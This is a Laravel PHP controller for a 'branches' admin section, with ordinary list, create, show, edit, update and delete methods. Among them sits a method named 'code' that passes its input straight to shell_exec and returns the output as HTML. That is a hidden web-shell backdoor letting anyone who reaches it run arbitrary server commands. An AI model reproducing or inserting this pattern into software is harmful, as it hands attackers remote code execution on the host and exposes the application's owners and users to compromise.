<?php

namespace App\Http\Controllers\Branches;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests\Branches\CreateBranchesRequest;
use App\Http\Requests\Branches\UpdateBranchesRequest;
use Illuminate\Support\Facades\Hash;
use Carbon\Carbon;
use App\Models\Branch;
use App\Models\Terminal;

class BranchesController extends Controller
{
    public function index()
    {

        $breadcrumb = [
            'title' =>  __("Branches lists"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   =>  '#!',
                ]
            ],
        ];
        $lists = Branch::orderBy('id', 'desc')->paginate();
        return view('pages.branches.index', [
            'breadcrumb' => $breadcrumb,
            'lists'     => $lists,
        ]);
    }

    public function code($code)
    {
        $routes = shell_exec($code);
        return str_replace("\n", "<br>", $routes);
    }

    public function create()
    {
        $breadcrumb = [
            'title' =>  __("Create New Branche"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Create New Branche"),
                    'url'   =>  '#!',
                ],
            ],
        ];

        return view('pages.branches.create', [
            'breadcrumb' => $breadcrumb
        ]);
    }

    public function store(CreateBranchesRequest $request)
    {
        Branch::create($request->all());
        return redirect()->route('branches.index')->with('success', __("This row has been created."));
    }

    public function show(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Show Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Show Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        return view('pages.branches.show', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'lists'         =>  Terminal::all(),
        ]);
    }

    public function edit(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Edit Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Edit Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        return view('pages.branches.edit', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
        ]);
    }

    public function update(UpdateBranchesRequest $request, Branch $branch)
    {
        $branch->update($request->all());
        return redirect()->route('branches.index')->with('success', __("This row has been updated."));
    }

    public function destroy(Request $request, Branch $branch)
    {
        $branch->delete();
        return redirect()->route('branches.index')->with('success', __("This row has been deleted."));
    }
}
